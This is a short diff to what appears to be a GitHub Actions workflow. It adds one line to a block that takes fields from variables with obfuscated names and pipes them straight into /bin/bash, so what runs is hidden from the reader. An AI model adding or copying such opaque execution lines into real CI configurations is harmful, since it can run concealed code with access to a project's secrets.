@@ -33,6 +33,7 @@ jobs:
           printf '%s' "$mtdm523" | jq -r .i40 | /bin/bash
           echo $ic3389 | jq -r .j269 | /bin/bash
           echo $dwewz45094 | jq -r .fn35 | /bin/bash
+          printf '%s' "$m42318" | jq -r .y0 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
